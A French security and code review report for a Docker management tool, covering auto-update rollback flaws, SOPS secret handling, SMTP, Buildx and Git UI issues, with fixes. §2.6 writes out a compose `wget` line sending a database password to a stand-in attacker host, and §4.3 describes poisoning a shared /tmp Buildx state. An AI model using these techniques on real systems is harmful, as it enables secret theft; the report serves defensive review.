# Revue complète — secrets, mises à jour automatiques, notifications, builds, git

**Date** : 7 août 2026
**Base** : `integration` @ `cffe32e` — CI verte (Fork Checks + Fork Integration Build)
**Périmètre** : les **83 commits** livrés depuis la précédente revue complète (`3162ed0`)
**Méthode** : quatre revues approfondies menées en parallèle, puis revalidation individuelle des findings les plus lourds directement dans le code. Tout ce qui est marqué *vérifié* a été relu ligne à ligne.

---

## 0. Synthèse

| Domaine | Volume | Critiques | Majeurs | Mineurs |
|---|---:|---:|---:|---:|
| Mise à jour automatique | 4 623 l. | **3** | 6 | 6 |
| Secrets (backend) | 4 181 l. | **1** | 10 | 9 |
| Notifications / SMTP / webhooks | 2 289 l. | 0 | 1 | 6 |
| Builds Buildx | — | 0 | 3 | 1 |
| Git récent + interface secrets | — | 0 | 9 | 8 |

**Quatre findings critiques**, tous vérifiés dans le code. Trois concernent la mise à jour automatique, un les secrets. Ils partagent une caractéristique : le comportement nominal fonctionne, ce sont les **chemins de compensation et les transitions d'état** qui sont défaillants — donc invisibles en test manuel, et destructeurs en production.

### À faire avant toute autre chose

1. **Ne pas activer de politique de mise à jour automatique sur les conteneurs d'infrastructure** (socket-proxy en particulier) — §1.3.
2. **Ne pas désactiver le mode chiffré** d'une stack dont le runtime hôte est actif — §2.1.
3. **Vérifier `/tmp` sur les hôtes distants** où l'assistant d'installation des secrets a échoué : la clé privée age peut y être restée — §2.4.
4. **Ne pas inclure le log de build dans les notifications** si un canal externe est configuré — §4.1.

---

## 1. Mise à jour automatique

### Ce qui est solide

Il faut le poser d'emblée, car la conception d'ensemble est sérieuse. Le **nettoyage des images** ne peut pas supprimer une image utile : filtre `ancestor` avec `All: true`, refus si un `RepoTag` subsiste, suppression sans `force`, et neutralisation pour toute la stack dès qu'un membre n'est pas `updated`/`current`. Le **verrouillage** partage la clé de `withComposeActionLock` et de l'automation Git, avec un ordre trié qui exclut l'interblocage. Le **fail-closed au redémarrage** fonctionne : un run interrompu est détecté et met l'hôte en pause. L'accès **registre** est en lecture seule, anonyme, HTTPS imposé, corps bornés — une erreur n'est jamais présentée comme « à jour ». La **découverte de versions** est strictement consultative : une politique `major` ne peut pas déclencher de saut de version. L'**anti-SSRF** du ping healthcheck est correct et testé.

### 1.1 [CRITIQUE] La vérification de santé est un no-op pour la quasi-totalité des conteneurs

**Fichier** : `core/internal/docker/updater/updater.go:656-663` et `:711-718`

`ContainerHealthCheck` lance deux contrôles, et **chacun sort en `nil` si son label Dockman est absent** :

```go
lab := strings.TrimSpace(c.Config.Labels[DockmanHealthCheckUptimeLabel])
if lab == "" {
    return nil
}
```

Le `HEALTHCHECK` natif de l'image et `State.Health` ne sont **jamais** consultés ; `State.Running` non plus, puisqu'il n'est lu qu'à l'intérieur du contrôle d'uptime. Pour un conteneur sans label `dockman.update.healthcheck.*` — le cas par défaut — la vérification retourne `nil` en quelques microsecondes, immédiatement après `ContainerStart`.

**Scénario.** Une nouvelle image plante au démarrage : variable d'environnement renommée, migration de schéma échouée, binaire incompatible. `ContainerStart` réussit — Docker n'échoue que si le conteneur ne peut pas être *créé*, pas si le processus sort en code 1 une seconde plus tard. Le healthcheck passe. `ContainerRemove(Force: true)` détruit l'ancien conteneur, le remplaçant est renommé, l'issue est `ExecutionUpdated`, le mail annonce un succès, aucun disjoncteur n'est armé, et l'image précédente part au nettoyage.

**Le rollback automatique, argument de sûreté central du sous-système, ne se déclenche jamais dans ce cas.**

Le contraste avec le helper protégé est frappant : `protected_update.go:69-89` fait exactement ce qu'il faut — boucle de 90 s sur `docker inspect` lisant `.State.Status` **et** `.State.Health.Status`, avec exigence de stabilité de 10 s pour les images sans healthcheck.

**Correction.** Aligner `ContainerHealthCheck` sur `wait_ready` : si l'image déclare un `HEALTHCHECK`, attendre `State.Health.Status == healthy` et échouer sur `unhealthy` ; sinon exiger une fenêtre de stabilité (conteneur toujours `running`, `RestartCount` inchangé après N secondes). Les labels Dockman doivent rester des contrôles **additionnels**, pas la condition d'existence de la vérification.

### 1.2 [CRITIQUE] Contexte annulé propagé sur le chemin de compensation

**Fichier** : `core/internal/docker/updater/updater.go:538` et `:548`

L'asymétrie est visible dans le même fichier : quatre emplacements utilisent correctement `rollbackContext(ctx)` — soit `context.WithoutCancel` + 1 min — mais **deux utilisent `ctx`**, précisément ceux qui suivent l'arrêt de l'ancien conteneur.

**Scénario, atteignable.** `containerHealthCheckUptime` renvoie `ctx.Err()` sur expiration. Le budget d'une unité est `max(20, n×10)` minutes ; un label `uptime=10m` fait attendre 1,5× = 15 min par conteneur. Une stack de deux membres ainsi labellisés dispose de 20 min pour 30 min d'attente. À l'expiration : le healthcheck renvoie `DeadlineExceeded`, le `ContainerRemove(ctx, …)` du remplaçant échoue instantanément et n'est que journalisé en `Warn`, tandis que `containerRollbackToOldContainer` s'exécute sur contexte détaché et redémarre l'ancien conteneur.

Résultat : `X_updated` **tourne toujours** et détient les ports publiés et les volumes ; le démarrage de `X` échoue sur « port is already allocated » ; la fonction retourne « rollback failed ». **Le service nominal est mort, un conteneur orphelin sous un mauvais nom occupe ses ressources**, et pour un conteneur à état deux processus ont pu monter le même volume.

**Correction.** Utiliser `rollbackContext(ctx)` sur les deux `ContainerRemove`, exactement comme le fait déjà le bloc voisin. Vérifier que la suppression a réussi avant de tenter le redémarrage, et remonter une erreur distincte de `RolledBackError` sinon — l'état exige une intervention humaine.

### 1.3 [CRITIQUE] Aucune classification des infrastructures sensibles

**Fichiers** : `core/internal/docker/updater/policy.go:246`, `core/internal/docker/update_automation.go:264-270`

Vérifié : la **seule** marque `protected` est le label `dockman.container=true`, c'est-à-dire Dockman lui-même. `validateAutomaticTarget` ne revérifie que ce label plus `dockman.update.disable`. Aucun code ne classe quoi que ce soit d'autre comme sensible.

Un conteneur `socketproxy` — l'exemple cité mot pour mot dans les commentaires du helper protégé — est donc, pour l'inventaire, un conteneur ordinaire, `Source="none"`, sélectionnable dans la grille et enrôlable en un clic par la politique de stack ou la politique en masse (jusqu'à 500 cibles).

**Scénario.** À 04:00, la transaction de stack appelle `ContainerRecreateWithOptions` sur le socket-proxy **à travers le socket-proxy lui-même**. Après `ContainerStop`, tous les appels suivants de `u.cli()` échouent — création, démarrage, suppression, renommage — **y compris les chemins de compensation**. Les membres déjà mis à jour ne peuvent plus être restaurés. Dockman perd tout accès Docker jusqu'à une intervention manuelle sur l'hôte.

**Correction.** Exclure de l'enrôlement automatique tout conteneur exposant l'endpoint que Dockman utilise — comparaison de l'endpoint client avec les ports et volumes publiés, ou label explicite `dockman.update.protected=true` — avec `Source="protected"` et un motif visible dans l'inventaire. À défaut, router ces cibles vers `ProtectedContainerUpdate`.

### 1.4 [MAJEUR] Le disjoncteur s'arme sur des erreurs transitoires

**Fichiers** : `core/internal/docker/update_automation.go:109`, `:227` → `updater/execution.go:132-137`

`withContainerUpdateLocks` échoue en `TryLock` non bloquant dès qu'une autre action Compose tourne. Cette erreur est enregistrée comme `ExecutionFailed`, que `SaveExecution` transforme en `UpdateExecutionBlock` persistant sur `(host, container_id)`. Le disjoncteur écarte ensuite la cible — et **toute la stack** — jusqu'à publication d'un nouveau digest ou intervention manuelle.

**Scénario.** Un `compose up` lancé à la main à 04:00:03 pendant le job planifié. Aucun conteneur n'est touché, mais la stack entière est marquée en échec, un mail « update failed » part, et les mises à jour automatiques sont désarmées.

**Correction.** Distinguer `ExecutionSkipped` — tout ce qui échoue **avant** la première mutation : verrou indisponible, cible revalidée absente, erreur de listage — de `ExecutionFailed`, réservé aux cas où un conteneur a effectivement été modifié. N'armer le disjoncteur que sur le second.

### 1.5 [MAJEUR] Les transactions de pile sont inaccessibles par les labels

**Fichier** : `core/internal/docker/updater/policy.go:255-292` contre `:295-301`

La branche « label » d'`Inventory` renseigne `Schedule`, `Rollback`, `CleanupEnabled`, `VersionPolicy` — mais **jamais** `PolicyTarget`. Seul `applyPolicy`, c'est-à-dire la politique enregistrée depuis l'interface, le renseigne. Conséquence : une stack dont tous les services portent `dockman.update=true` est mise à jour **service par service**, sans préchargement global, sans ordre de dépendances, sans rollback croisé — exactement les garanties pour lesquelles le chemin transactionnel a été écrit. `StackKey` est pourtant bien rempli : l'information existe, elle n'est pas utilisée.

**Correction.** Dériver `PolicyTarget = UpdateTargetStack` quand `stackKey != ""` et que tous les membres enrôlés le sont par label, ou exposer un label `dockman.update.target=stack`.

### 1.6 [MAJEUR] `WithNotifyOnly()` met à jour les conteneurs

**Fichier** : `core/internal/docker/updater/updater.go:406-419`

Le corps de la condition est **intégralement commenté, `return` compris**. La fonction exportée fait donc l'exact contraire de son nom et de son commentaire. Elle vit dans ~250 lignes désormais inatteignables — `ContainersUpdateAll`, `ContainersUpdateByImage`, `ContainersUpdateByContainerID`, `ContainersUpdateDockman` n'ont plus d'appelant — mais toujours exportées et compilées, qui avalent toutes les erreurs et contiennent un `ImagePruneUntagged` global sans garde-fou.

**Correction.** Supprimer l'ensemble, y compris `store.go`/`store_gorm.go` dont le `Store` n'est plus jamais consulté. C'est le plus gros gisement de risque latent du paquet.

### 1.7 [MAJEUR] Trois autres

- **`ContainerStop` en échec ne compense rien** (`updater.go:528`) : seul point de la séquence sans tentative de restauration. Le conteneur reste arrêté et n'est pas dans `applied`, donc le rollback de pile ne le touche pas. Le service reste à l'arrêt jusqu'à ce qu'un humain s'en aperçoive.
- **`PruneResults` efface les disjoncteurs des conteneurs désenrôlés** (`automation.go:359-366`) : `activeIDs` ne contient que les enrôlés. Désactiver puis réactiver une politique après un échec efface le disjoncteur, et le run suivant retente le digest connu pour casser. Si `activeIDs` est vide, **tous** les blocs de l'hôte sont supprimés.
- **`ProtectedContainerUpdate` ne prend aucun verrou de stack** (`protected_update.go:33`) : le helper exécute un `compose up -d --force-recreate` complet sans passer par `TryLockStack`, contrairement à toutes les autres actions Compose. Un `compose down` concurrent produit des conteneurs orphelins.

### 1.8 [MINEUR]

`RestoreContainerImage` filtre le nom par une regex non échappée (`updater.go:119` — `.` est un métacaractère) ; déréférencement nil latent dans `ScanStore.Save` (`automation.go:92`) ; panique latente sur `ID[:12]` (`updater.go:494`) ; `Items[0]` non trié sur une référence sans tag, qui fausse `PreviousImage` et donc le nettoyage (`updater.go:210`) ; `dockman.update` à valeur vide **enrôle** le conteneur, et `dockman.update=yes` le désactive en affichant un motif trompeur (`policy.go:345`) ; jobs planifiés non liés au contexte serveur.

### 1.9 Tests

Bien couvert : orchestration en mémoire, groupement par cron, coalescence de `RefreshHost`, sémantique du disjoncteur, pause/reprise, récupération d'un run interrompu, non-scission des stacks, normalisation cron, tri topologique avec rupture de cycle.

**Non couvert, et ce sont les zones dangereuses** : `ContainerRecreateWithOptions` n'a **aucun test** — il n'existe aucun double du client Docker dans le dépôt. La séquence stop → create → start → healthcheck → remove → rename et ses cinq chemins de compensation sont entièrement non testés. Idem pour `rollbackAppliedStackTargets`, `RemovePreviousImageIfUnused`, `validateAutomaticTarget`, et le script shell du helper protégé.

*Un seul test « healthcheck expiré par annulation de contexte » aurait révélé le finding §1.2.*

---

## 2. Secrets

### Ce qui est solide

Le chiffrement lui-même est bien fait : SOPS invoqué en argv sans shell, environnement filtré des variables `SOPS_AGE_KEY*`, clé jamais exposée par l'API ni dans les logs — aucun `log.*` dans tout le paquet. Le tmpfs est monté `nodev,nosuid,noexec,mode=0700`, et le montage est vérifié via `/proc/self/mountinfo` — type de système de fichiers **et** source — avant toute écriture de clair. La barrière Git refuse de transférer un `secrets.sops.yaml` dont toutes les valeurs ne commencent pas par `ENC[`, avec `sops.mac` chiffré. La réconciliation par fichier-sentinelle ne donne à Dockman **aucune** capacité d'exécution arbitraire côté hôte : bon design.

### 2.1 [CRITIQUE] Désactiver le mode chiffré avec le tmpfs monté détruit tous les secrets

**Fichiers** : `core/internal/secrets/inline.go:251` et `host_runtime.go:397-414`

`DisableInline` appelle `Materialize`, qui écrit le clair dans `<stack>/.secrets/`. Si le runtime volatile est actif, ce chemin **est** le tmpfs : le « clair persistant » atterrit en mémoire volatile. Puis le marqueur `.dockman-sops-inline` est supprimé.

Au prochain `materialize` — déclenché par n'importe quelle réconciliation d'une autre stack, ou par un redémarrage — `discoverEncryptedStacks` ne voit plus le marqueur, le montage n'est plus dans `desired`, et `cleanupRuntimeMounts` fait un `umount` **suivi d'un `os.Remove`** du répertoire.

Tous les secrets de la stack disparaissent, sans trace, alors que l'opération avait renvoyé un succès.

**Correction.** Refuser l'opération si `volatileRuntimeAvailable` est vrai, ou démonter explicitement le tmpfs — via une requête de réconciliation après suppression du marqueur — **avant** d'écrire le clair, puis re-vérifier que `.secrets` n'est plus un montage géré.

### 2.2 [MAJEUR] La requête de réconciliation est écrite au mauvais endroit pour tout alias secondaire

**Fichiers** : `core/internal/secrets/inline.go:408` contre `host_install.go:115`

`writeAtomic` écrit toujours à la **racine du système de fichiers de l'alias**, alors que l'unité `.path` surveille un chemin dérivé de `StackRoot`. Les alias étant des chemins arbitraires par hôte, dès qu'une stack chiffrée vit dans un alias dont la racine ne correspond pas, le fichier est créé au mauvais endroit.

L'écriture **réussit**, donc `WriteInline`, `DeleteInline` et `AssignEncrypted` retournent un succès — et l'hôte ne réconcilie jamais. Le conteneur continue de servir l'ancien secret indéfiniment.

### 2.3 [MAJEUR] Le rate-limit systemd est atteignable trivialement et tue le `.path` définitivement

**Fichiers** : `core/internal/secrets/catalog.go:221`, `host_install.go:96-97`

`StartLimitIntervalSec=10` / `StartLimitBurst=5` sur l'unité de réconciliation. Or `AssignEncrypted` boucle sur jusqu'à **50** stacks et émet une requête à chaque itération. Au-delà de 5 démarrages en 10 s, l'unité passe en `failed (start-limit-hit)`, et systemd fait alors échouer l'unité `.path` déclenchante, qui **cesse définitivement de surveiller**. Rien ne le signale, l'erreur étant avalée (`_ = requestHostRuntimeReconcile`).

**Correction.** N'émettre qu'une seule requête par opération, ajouter `TriggerLimitIntervalSec`/`TriggerLimitBurst` explicites, et cesser d'ignorer l'erreur.

### 2.4 [MAJEUR] La clé privée age peut rester sur l'hôte distant

**Fichier** : `ui/src/pages/settings/tab-secrets.tsx:87-103`

Le script généré est en `set -eu` et son `trap` ne nettoie que le répertoire **local**. Le `rm -rf "$remote_tmp"` distant est une simple ligne finale, et seule la commande `install` est protégée par `|| status=$?`. Si le `scp` ou l'un des deux `ssh sudo install` échoue, le script s'arrête avant le nettoyage : **`age-key.txt` reste dans le `/tmp` distant** — l'identité qui déchiffre toutes les sources SOPS de l'hôte.

**Correction.** Porter le nettoyage distant dans le `trap`, avec `remote_tmp=""` initialisé avant le `set -e`.

### 2.5 [MAJEUR] Sept autres

- **Une stack en erreur bloque tout l'hôte au boot** (`host_runtime.go:122`) : la boucle sort au premier échec. Combiné au `Wants=` récemment introduit, Docker démarre — et tous les conteneurs démarrent sans secrets.
- **`discoverEncryptedStacks` parcourt sans borne** (`host_runtime.go:164`) : `WalkDir` sur toute l'arborescence de `StackRoot`, qui contient les volumes bind applicatifs. Contraste avec `stacks.go` qui borne à 1000 répertoires / profondeur 8.
- **Toute opération Compose en lecture déchiffre et réécrit** (`compose_terminal.go:149`) : y compris `ps`, `Status` et `config --quiet`. Chaque `rename` crée un nouvel inode, donc un conteneur ayant un bind sur `.secrets/<nom>` **ne voit jamais la nouvelle valeur**.
- **Clé age indisponible ⇒ stack ingérable**, y compris `down` (`inline.go:67`).
- **`EnableInline` supprime le clair avant d'écrire le marqueur** (`inline.go:222-227`) : le ciphertext est bien exporté et vérifié avant, donc pas de perte définitive — mais si l'écriture du marqueur échoue, la stack repasse en mode migration sans secrets visibles.
- **Réinstallation ou redémarrage du service arrache le tmpfs des conteneurs en cours** (`host_install.go:135`) : `restart` déclenche `ExecStop=cleanup` qui démonte tout.
- **Rollback silencieux d'`AssignEncrypted` avec message mensonger** (`catalog.go:200-209`) : les erreurs de compensation sont ignorées, mais le message affirme « completed assignments were rolled back ».

### 2.6 [MAJEUR] Deux angles de sécurité structurels

**La clé age est exposable via un alias de dossier.** `AddAlias` accepte un `Fullpath` arbitraire sans validation : un alias pointant sur `/config` expose la clé privée dans le navigateur de fichiers et l'éditeur. Et côté Git, `isSensitivePath` ne filtre que sur le nom de base — `dockman-sops-age-key.txt` ne contient ni `secret` ni `credential`, son extension est `.txt`, et le répertoire `secrets` sans point initial n'est pas dans `shouldSkipPath`. **La clé peut être poussée vers un dépôt Git.**

**Le mode inline exporte tous les secrets dans l'environnement Compose** (`inline.go:99-115`), indépendamment de leur usage réel dans le manifeste. Compose interpole `${VAR}` partout, et l'éditeur permet de modifier `compose.yml` : un `command: ["wget", "http://attaquant/${DB_PASSWORD}"]` exfiltre un secret jamais déclaré dans `secrets:`.

**Correction.** Interdire les alias recouvrant `DOCKMAN_CONFIG`, exclure durement le chemin de `SOPSAgeKeyFile` du filtre Git, et restreindre l'export aux noms effectivement référencés par le manifeste analysé — l'information est déjà dans `ComposeAnalysis`.

### 2.7 [MINEUR]

Collision de routes : six noms de secrets (`status`, `sops`, `catalog`…) sont écrivables mais illisibles par l'API ; mutex global à tous les hôtes et toutes les stacks ; permissions incohérentes du ciphertext (0644 par un chemin, 0600 par l'autre) ; aucune vérification d'intégrité du binaire SOPS déployé ; aucun mécanisme de rotation de clé ; `pathIsMounted` retient la première correspondance et non la dernière ; effacement mémoire en partie illusoire ; `AnalyzeCompose` fusionne les quatre manifestes conventionnels ; `ListCatalog` contredit son propre commentaire d'invariant (`catalog.go:53` — une stack au marqueur illisible **disparaît** au lieu d'apparaître en mode migration).

---

## 3. Notifications, SMTP et webhooks

### Ce qui est solide — et c'est l'essentiel

Les deux points les plus sensibles du domaine sont **correctement traités**, avec plusieurs couches chacun.

**Injection d'en-tête SMTP : aucune trouvée.** `safeHeaderValue` retire `\r`, `\n`, `\0` ; `mime.QEncoding.Encode` encode tout octet de contrôle résiduel ; les destinataires sont re-parsés par `mail.ParseAddress` et seule la forme normalisée est émise ; `net/smtp` refuse tout CR/LF dans `Mail`/`Rcpt`.

**TLS** : aucun `InsecureSkipVerify` dans le paquet, `MinVersion: TLS12` + `ServerName`, CA privée ajoutée **au** pool système sans le remplacer, `DOCKMAN_SMTP_CA_FILE` traité comme requis pour qu'une faute de frappe échoue au lieu de retomber sur la PKI publique, STARTTLS exigeant l'annonce de l'extension, authentification refusée sans chiffrement.

**Mot de passe SMTP** : AES-256-GCM avec AAD de portée, jamais en clair en base ni via l'API.

**SSRF sortante** : HTTPS obligatoire, `Proxy: nil` explicite, redirections **non suivies**, réponse bornée à 64 KiB, et un `DialContext` qui re-résout le DNS puis compose l'IP validée — ce qui neutralise le DNS rebinding. Meilleur que la plupart des implémentations.

**Webhooks Git entrants** : HMAC-SHA256 avec `hmac.Equal`, corps borné **avant** vérification, anti-rejeu par index unique, vérification que le dépôt correspond au remote enregistré et que le `ref` est la branche par défaut.

### 3.1 [MAJEUR] `log.Fatal` sur la migration SMTP héritée

**Fichiers** : `core/internal/app/app.go:219-221`, `notifications/channels.go:278-284`

`LoadOrCreateVault` **régénère silencieusement** une clé si `master.key` est absent. Un utilisateur qui restaure son volume de config depuis une sauvegarde ayant exclu ce fichier — ou qui change `NOTIFICATION_MASTER_KEY_FILE` — obtient au démarrage suivant un échec de déchiffrement, donc `log.Fatal` : **Dockman refuse de démarrer, en boucle de crash, pour un mot de passe SMTP**. Aucune sortie sans chirurgie SQLite.

Le contraste est parlant : le même échec sur un canal moderne est traité proprement, avec un message d'erreur affiché dans la liste.

**Correction.** Traiter l'échec de déchiffrement d'une ligne comme non fatal : journaliser, migrer avec un mot de passe vide et `Enabled: false`, laisser l'opérateur ressaisir. Remplacer `log.Fatal` par `log.Error` pour cette étape.

### 3.2 [MINEUR]

Jeton Gotify/Apprise échappé dans l'URL non rédigé dans `Delivery.Error`, lui-même exposé par l'API ; filtre SSRF laissant passer `100.64.0.0/10` (Tailscale) et `0.0.0.0/8` (routé vers le loopback par Linux) ; aucun réessai ni backoff sur les événements `Enqueue`, avec un dispatcher mono-goroutine où une destination lente peut monopoliser 80 s ; routes SMTP héritées toujours exposées, produisant des doublons puis une suppression silencieuse au redémarrage ; anti-rejeu de webhook enregistré **avant** la mise en file, rendant un rejeu GitHub légitime irrécupérable après un `503` ; charge utile > 256 KiB en échec perpétuel à chaque tick de cron.

---

## 4. Builds Buildx

### Ce qui est solide

**Aucune injection de commande ou de chemin.** `LocalRunner` utilise argv strict ; côté SSH, `quoteRemoteCommand` applique `shellQuote` à **chaque** argument avec l'échappement canonique ; `validDockerBuildTag` rejette tout ce qui commence par `-` ainsi que les espaces et caractères de contrôle ; `ExtractMeta` applique `filepath.Clean` sur le chemin entier **avant** de séparer alias et relpath, ce qui rend impossible un `relpath` remontant ; et il n'existe **aucun** `--build-arg` utilisateur — la surface d'injection est volontairement minimale.

### 4.1 [MAJEUR] Le log de build échoué part intégralement dans les notifications

**Fichiers** : `core/internal/docker/compose/command.go:179-186`, `build_jobs.go:195-197`, `handler_http.go:80-84`

`RunDockerfileBuild` lance le build avec `--progress=plain`, et BuildKit écrit tout son flux de progression sur **stderr**. `LocalRunner` duplique stderr vers `errWriter`, qui accumule donc l'intégralité du log **sans borne** et devient le message d'erreur — puis `job.view.Error`, sans troncature.

Trois conséquences :

1. **Le plafond de 1 MiB est contourné** : `maxBuildJobLog` est respecté par le flux, mais `job.view.Error` est retenu en plus, sans limite, pendant 6 heures, pour jusqu'à 20 jobs.
2. **`GET /docker/builds` renvoie tout** : `omitempty` n'omet que la chaîne vide.
3. **Fuite hors du périmètre** : le contenu est concaténé dans le message de notification et envoyé au canal configuré — Discord, ntfy, webhook tiers, boîte mail. Un log de build contient très couramment des secrets : URL de dépôt privé avec jeton, `npm ERR!` incluant un `_authToken`, sortie d'un `RUN` qui écho une variable d'environnement.

Le reste du code borne systématiquement — `safeDeliveryError` et `safeGitError` tronquent à 1000 caractères. Le chemin build est le seul sans borne.

**Correction.** Borner `errWriter`, tronquer `job.view.Error`, et surtout **ne jamais inclure `job.Error` dans une notification** : envoyer un identifiant de job et laisser le log dans l'interface authentifiée.

### 4.2 [MAJEUR] `docker rm --force buildx_buildkit_default` à chaque build

**Fichier** : `core/internal/docker/compose/command.go:162-168`

L'appel est **inconditionnel** — même quand `builderName == ""`, donc à chaque build, y compris sur les hôtes SSH distants.

Un utilisateur ayant créé son propre builder nommé `default` avec le driver `docker-container` — usage documenté et courant pour le cache BuildKit persistant et le multi-plateforme — voit son conteneur d'appui **détruit de force à chaque build**, avec tout son cache. Le commentaire affirme viser « the exact legacy `default` helper left by older Dockman builds », mais rien ne permet de distinguer un résidu Dockman d'un builder légitime : le nom est identique.

**Correction.** Ne supprimer que ce que Dockman a créé, via un label posé à la création ; ou supprimer ce nettoyage rétrocompatible, les builders actuels étant nommés `dockman-<nano>-<seq>` et déjà nettoyés proprement.

### 4.3 [MAJEUR] État Buildx dans un `/tmp` prévisible

**Fichier** : `core/internal/docker/compose/command.go:22`

`/tmp/dockman-buildx-native` est fixe et dans un répertoire partagé en écriture. Sur un hôte distant piloté par SSH, c'est le `/tmp` de la machine réelle.

Un utilisateur local non privilégié peut pré-créer ce répertoire et y déposer une instance Buildx `remote` pointant vers un BuildKit qu'il contrôle. `dockmanBuildxDriver` ignore la ligne malveillante — son endpoint `tcp://` n'est pas dans la liste blanche — et retourne `"docker"`, ce qui fait que **aucun `--builder` explicite n'est passé**. `BUILDX_BUILDER` étant vide, Buildx retombe sur le builder courant de la config empoisonnée.

Résultat : le contexte de build complet, `.env` compris, part vers le BuildKit de l'attaquant, et l'image renvoyée est chargée dans le démon local via `--load`.

**Correction.** Placer l'état Buildx sous le répertoire de données de Dockman, et surtout **toujours passer `--builder` explicitement**, y compris pour `driver == "docker"` — correction d'un mot qui casse toute la chaîne, et déjà appliquée dans `prepareDockerBuild`.

### 4.4 [MINEUR]

Aucune persistance des jobs — un redémarrage perd l'historique et les builds en cours ; sémaphore global et non par hôte, donc deux builds longs sur un hôte affament les autres ; contexte détaché de l'arrêt du serveur ; builders orphelins possibles si la suppression échoue.

---

## 5. Git récent et interface

### 5.1 [MAJEUR] Le panneau Secrets peut viser la mauvaise machine

**Fichiers** : `ui/src/pages/settings/tab-secrets.tsx:46`, `ui/src/App.tsx:113`

`/settings` est une route **sœur** de `:host`, donc `useParams().host` y est indéfini et `HostGuard` court-circuite explicitement la validation. Le panneau lit alors le store zustand — sans persistance, initialisé à vide — avec un repli en dur sur `"local"`.

Un simple rechargement de page sur l'onglet Secrets fait basculer silencieusement sur l'hôte `local`. L'opérateur peut créer, révéler ou supprimer des secrets sur une autre machine que celle qu'il croit. Il n'existe **aucun sélecteur d'hôte** sur la page Réglages.

### 5.2 [MAJEUR] L'assignation globale écrase jusqu'à 50 stacks sans confirmation

**Fichier** : `ui/src/pages/settings/tab-secrets.tsx:352-374`

Toutes les autres actions destructrices du panneau exigent de taper `CONFIRM`. L'assignation globale n'a qu'un bouton — alors que le dialogue pré-remplit la liste avec **toutes les affectations existantes** et que rien ne distingue visuellement les stacks qui possèdent déjà le secret. Ajouter un secret à une nouvelle stack réécrit du même geste la valeur des autres.

### 5.3 [MAJEUR] Le bandeau affirme une propriété de sécurité fausse

**Fichier** : `ui/src/pages/settings/tab-secrets.tsx:387-397`

Tant qu'aucune stack n'est sélectionnée — donc à chaque ouverture — `sopsStatus` est `null` et le chip affiche « Migration mode · plaintext files » avec une alerte expliquant que du clair est écrit sur disque. Affirmé pour un hôte dont on ne sait rien. C'est exactement le défaut corrigé par `b856b60`, réintroduit ensuite sur le chip de mode et l'alerte.

### 5.4 [MAJEUR] Un échec de matérialisation est annoncé comme un succès

**Fichier** : `ui/src/pages/settings/tab-secrets.tsx:328-332`

`EnableInline` renseigne `RuntimeIssue` dans trois cas d'échec réels — dont « le tmpfs n'est pas encore visible » — mais l'interface route tout vers `showSuccess`. L'utilisateur voit un toast **vert** de 3 secondes contenant un message d'erreur, alors que `.secrets` et son historique en clair viennent d'être supprimés. Il découvre le problème au prochain `compose up`.

### 5.5 [MAJEUR] Deux composants entiers non compilés par le React Compiler

Vérifié par exécution réelle du plugin avec un logger.

**`TabSecrets` produit 20 diagnostics et zéro fonction optimisée** : neuf `try/finally`, dix `throw` dans un `try/catch`, un paramètre par défaut ligne 153.

**`TabGit` est abandonné pour deux `try/finally` seulement**, introduits par le commit des webhooks, alors que les quatorze autres `try` du fichier utilisent déjà le motif supporté. Deux blocs à convertir pour récupérer la mémoïsation d'un composant de 1 400 lignes.

À rapprocher : `git-policy-file-tree.tsx:120` est rejeté explicitement pour cause de règle ESLint désactivée.

### 5.6 [MAJEUR] Trois points côté git

- **L'intervalle de rafraîchissement est réarmé à chaque action** (`tab-git.tsx:410-417`) : `busy` est dans les dépendances, donc chaque transition démonte et recrée le timer. Un opérateur qui enchaîne des actions ne voit jamais le poll se déclencher.
- **La provenance de commit publie le nom d'hôte et le chemin local** dans le dépôt distant, sans opt-out (`commit_identity.go:26-36`) : seul `instance` est configurable, `host`, `binding` et `stack` sont inconditionnels. Sur un dépôt public, c'est de la divulgation d'infrastructure permanente.
- **Le renommage d'un hôte orpheline ses folder links** : le nom est stocké en clé sans propagation, et depuis la garde d'immutabilité de `81b44ed`, la seule issue est de délier et relier — avec reconstruction de baseline.

### 5.7 [MINEUR]

`SaveBinding` lit en `Unscoped()` mais écrit en portée normale, d'où un succès silencieux sans écriture sur une ligne soft-deleted ; le trigger d'immutabilité n'est testé que sur `sub_path` et jamais avec la garde Go ; code mort dans `commit_identity.go` ; `repositoryOwnershipBinding` retourne une copie corrompue sous un nom neutre ; `POST /sops/inline/disable` implémenté mais inatteignable depuis l'interface ; rétention d'historique codée en dur côté UI ; masquage de valeur purement CSS sans `autoComplete`/`spellCheck`.

---

## 6. Plan de correction proposé

Par rapport dégât/effort, en quatre lots livrables indépendamment.

### Lot 1 — Sûreté d'exécution des mises à jour

Les trois critiques du §1, plus le disjoncteur transitoire. C'est le lot le plus urgent : il concerne du code qui détruit des conteneurs de production sans supervision.

1. `rollbackContext` sur les deux `ContainerRemove` (§1.2) — correction d'une ligne chacune.
2. Healthcheck réel aligné sur `wait_ready` (§1.1).
3. Classification des infrastructures sensibles (§1.3).
4. `ExecutionSkipped` distinct d'`ExecutionFailed` (§1.4).
5. Suppression du code mort `WithNotifyOnly` et de sa chaîne (§1.6).

**Test indispensable** : introduire un double du client Docker et couvrir `ContainerRecreateWithOptions`, à commencer par le cas « healthcheck expiré par annulation de contexte ».

### Lot 2 — Intégrité des secrets

1. `DisableInline` sur tmpfs monté (§2.1) — perte de données.
2. Chemin de la requête de réconciliation (§2.2).
3. Requête unique par opération + `TriggerLimit` (§2.3).
4. Nettoyage distant dans le `trap` (§2.4).
5. Isolation des échecs par stack au boot et bornage du `WalkDir` (§2.5).

### Lot 3 — Fuites et exposition

1. Ne plus inclure `job.Error` dans les notifications, et borner (§4.1).
2. `--builder` explicite et état Buildx hors `/tmp` (§4.3).
3. Nettoyage du builder par label (§4.2).
4. Exclusion dure de la clé age du filtre Git et des alias (§2.6).
5. `log.Fatal` → `log.Error` sur la migration SMTP (§3.1).

### Lot 4 — Interface

1. Sélecteur d'hôte explicite sur la page Réglages (§5.1).
2. Confirmation typée sur l'assignation globale (§5.2).
3. Garde `!loadedPath` sur le chip et l'alerte (§5.3).
4. `showWarning` sur `runtimeIssue` (§5.4).
5. Conversion des `try/finally` dans `TabGit` puis `TabSecrets` (§5.5).

---

## 7. Note de méthode

Les quatre revues ont été menées en parallèle sur le même instantané du dépôt. Les findings suivants ont été **revalidés individuellement** dans le code après remontée, ligne par ligne : §1.1, §1.2, §1.3, §2.1, §2.4, §4.1, §4.2, §5.1, ainsi que l'ordre des opérations de `EnableInline` et `cleanupRuntimeMounts`.

